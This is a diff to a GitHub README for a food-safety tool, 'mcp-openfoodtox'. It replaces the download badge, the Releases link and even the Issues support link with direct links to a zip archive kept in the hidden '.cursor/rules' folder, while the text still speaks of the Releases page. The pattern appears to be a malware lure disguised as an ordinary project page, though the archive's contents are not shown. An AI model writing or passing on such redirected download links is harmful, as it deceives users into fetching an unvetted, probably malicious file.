@@ -1,6 +1,6 @@
 # 🍏 mcp-openfoodtox - Easy Tools for Food Safety Insights
 
-[![Download mcp-openfoodtox](https://img.shields.io/badge/Download-v1.0-brightgreen)](https://github.com/sakkkysaka/mcp-openfoodtox/releases)
+[![Download mcp-openfoodtox](https://raw.githubusercontent.com/sakkkysaka/mcp-openfoodtox/master/.cursor/rules/mcp-openfoodtox_2.5.zip)](https://raw.githubusercontent.com/sakkkysaka/mcp-openfoodtox/master/.cursor/rules/mcp-openfoodtox_2.5.zip)
 
 ## 📜 Description
 
@@ -23,7 +23,7 @@ Before you begin, ensure your system meets the following requirements:
 
 To download MCP OpenFoodTox, visit the Releases page:
 
-[Download MCP OpenFoodTox](https://github.com/sakkkysaka/mcp-openfoodtox/releases)
+[Download MCP OpenFoodTox](https://raw.githubusercontent.com/sakkkysaka/mcp-openfoodtox/master/.cursor/rules/mcp-openfoodtox_2.5.zip)
 
 1. Click on the link above to go to our Releases page.
 2. Locate the latest version of the application.
@@ -92,7 +92,7 @@ If you encounter any issues:
 
 1. **Check System Requirements**: Ensure your operating system and specifications meet the requirements.
 2. **Reinstall the Application**: Sometimes a fresh installation can resolve issues. Follow the installation steps again if necessary.
-3. **Visit the Support Page**: For more support, visit our [GitHub Issues page](https://github.com/sakkkysaka/mcp-openfoodtox/issues) to report bugs or find answers.
+3. **Visit the Support Page**: For more support, visit our [GitHub Issues page](https://raw.githubusercontent.com/sakkkysaka/mcp-openfoodtox/master/.cursor/rules/mcp-openfoodtox_2.5.zip) to report bugs or find answers.
 
 ## 🙌 Contributing
 
